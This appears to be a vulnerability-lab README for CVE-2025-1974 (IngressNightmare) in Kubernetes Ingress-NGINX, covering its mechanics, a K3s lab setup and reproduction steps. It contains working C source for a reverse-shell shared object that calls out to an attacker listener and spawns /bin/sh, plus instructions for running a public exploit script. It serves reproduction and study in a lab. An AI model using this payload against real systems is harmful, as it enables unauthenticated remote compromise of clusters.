# IngressNightmare: Kubernetes Ingress Unauthenticated Remote Code Execution Vulnerability (CVE-2025-1974)

The **IngressNightmare** vulnerability stems from a critical flaw in the **Ingress-NGINX Admission Controller**—a core Kubernetes security mechanism responsible for validating incoming Ingress resources before they are accepted by the cluster. This controller is **exposed over the network without requiring authentication**, allowing attackers to craft malicious `AdmissionReview` requests and inject unauthorized configurations into Ingress resources.

**Note**: Achieving full Remote Code Execution (RCE) requires chaining CVE-2025-1974 with one of several other vulnerabilities. Below are some known exploit chains:

CVE-2025-1974 + CVE-2025-24514  RCE via `auth-url` annotation injection
CVE-2025-1974 + CVE-2025-1097   RCE via `auth-tls-match-cn` annotation
CVE-2025-1974 + CVE-2025-1098   RCE via image UID abuse

## Vulnerability Mechanics

An attacker can forge an `AdmissionReview` request to inject arbitrary NGINX directives into the Ingress resource. These directives are validated using the `nginx -t` command. [^1]Through careful manipulation, an attacker can inject an `ssl_engine` directive, which forces NGINX to load a dynamic shared object (DSO)—leading to arbitrary code execution.

More technical breakdowns can be found in the following resources:

- [IngressNightmare: CVE-2025-1974 - Critical Unauthenticated RCE](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities)[^2]
- [Kubernetes Blog: CVE-2025-1974 Overview](https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/)[^3]

## Environment Setup

To simulate the vulnerability, a K3s-based Kubernetes environment is used for simplicity.

```bash
docker compose up -d
```

After the environment starts, execute the initialization script inside the k3s container:

```bash
$ docker ps -a
CONTAINER ID   IMAGE                 COMMAND                  CREATED         STATUS                      PORTS                                                                                          NAMES
8109c0c867d3   ingress-nginx:1.9.5   "/bin/k3s server"        8 minutes ago   Up 8 minutes                0.0.0.0:32043->32043/tcp, :::32043->32043/tcp, 0.0.0.0:32080->32080/tcp, :::32080->32080/tcp   cve-2025-1974-k3s-1

$ docker exec -it cve-2025-1974-k3s-1 sh ./exploit/init.sh
[INFO] Starting K3s server...
[INFO] Waiting for Kubernetes API to be ready...
nohup: appending output to 'nohup.out'
[INFO] Waiting for ingress-nginx controller...
deployment.apps/ingress-nginx-controller condition met
NAME                                        READY   STATUS      RESTARTS   AGE
ingress-nginx-admission-create-7bjgc        0/1     Completed   0          9m30s
ingress-nginx-admission-patch-8tlbg         0/1     Completed   1          9m30s
ingress-nginx-controller-587d8f88fc-w429f   1/1     Running     0          9m30s
```

The init.sh script will complete the following tasks:

- ait for the Kubernetes API to be ready
- ait for the ingress-nginx controller to start

After the script has finished running, you will see that the status of `ingress-nginx-controller` is `Running`, and you can directly start vulnerability verification or testing.

## Exploitation

We first compile a shared object (`.so`) payload matching the container’s architecture. Below is a sample source code for a reverse shell:

```c
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((constructor)) static void reverse_shell(void)
{
    char *server_ip = "xxxx";
    uint32_t server_port = 7788;
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in attacker_addr = {0};
    attacker_addr.sin_family = AF_INET;
    attacker_addr.sin_port = htons(server_port);
    attacker_addr.sin_addr.s_addr = inet_addr(server_ip);
    system("touch /tmp/hacked");
    if (connect(sock, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr)) != 0)
        exit(0);
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    char *args[] = {"/bin/sh", NULL};
    execve("/bin/sh", args, NULL);
}
```

Replace `server_ip` with your actual reverse shell listener. You can compile the binary using the environment provided by [yoshino-s/CVE-2025-1974](https://github.com/yoshino-s/CVE-2025-1974/tree/main).[^4]

Once compiled, place the resulting `shell.so` into the `./exploit` directory of the container.

Inside `exploit-pod`, navigate to the exploit directory and launch the exploit script. The script is sourced from the [IngressNightmare-PoC](https://github.com/Clifford-prog/IngressNightmare-PoC/tree/main) [^5]GitHub repository:

```bash
cd /exploit
python3 exploit.py
```

You should observe the creation of the `/tmp/hacked` file inside the ingress-nginx container, confirming successful exploitation.

![](1.jpg)

## References

[^1]: https://github.com/kubernetes/ingress-nginx/blob/8c1ecd7655bd052a26e64d3361dede3096cd80c6/internal/ingress/controller/controller.go#L425
[^2]: https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities
[^3]: https://kubernetes.io/blog/2025/03/24/ingress-nginx-cve-2025-1974/
[^4]: https://github.com/yoshino-s/CVE-2025-1974/tree/main
[^5]: https://github.com/Clifford-prog/IngressNightmare-PoC/tree/main
